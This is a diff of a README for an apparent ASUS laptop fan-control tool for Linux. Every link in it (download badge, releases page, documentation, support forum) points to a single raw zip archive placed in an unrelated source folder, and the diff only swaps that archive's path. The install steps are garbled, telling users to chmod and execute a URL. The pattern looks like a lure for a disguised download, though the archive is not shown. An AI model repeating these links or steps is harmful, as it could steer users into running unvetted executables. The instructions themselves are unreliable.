@@ -6,7 +6,7 @@ To manage your ASUS TUF or ROG laptop effectively, follow these steps to downloa
 
 ## 🔗 Download
 
-[![Download AsusTufFanControl](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip%https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip)](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip)
+[![Download AsusTufFanControl](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip%https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip)](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip)
 
 ## 💻 System Requirements
 
@@ -27,21 +27,21 @@ AsusTufFanControl_Linux offers a variety of features to enhance your laptop expe
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Head to the [Releases page here](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip).
+1. **Visit the Releases Page:** Head to the [Releases page here](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip).
    
 2. **Select a Version:** Choose the latest version from the list. It is usually at the top of the page.
 
-3. **Download the Application:** Click on the link for the installer file suitable for your system. It typically ends with `.AppImage` or `https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip`.
+3. **Download the Application:** Click on the link for the installer file suitable for your system. It typically ends with `.AppImage` or `https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip`.
 
 4. **Make the File Executable:** Once the download is complete, open your terminal and navigate to the folder where you downloaded the file. Use the following command to make it executable:
    ```
-   chmod +x https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip
+   chmod +x https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip
    ```
-   Replace `https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip` with the full file name if it is different.
+   Replace `https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip` with the full file name if it is different.
 
 5. **Run the Application:** Launch the application by entering this command in your terminal:
    ```
-   https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip
+   https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip
    ```
    Again, replace the file name as necessary.
 
@@ -73,7 +73,7 @@ This project is licensed under the MIT License. Please see the LICENSE file for 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip)
-- [Support Forum](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/translations/Linux-Tuf-Control-Fan-Asus-v3.7-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip)
+- [Support Forum](https://raw.githubusercontent.com/Aa1am/AsusTufFanControl_Linux/main/ui/pages/Asus_Tuf_Fan_Control_Linux_3.2.zip)
 
 Feel free to reach out for help or more details on any specific feature!
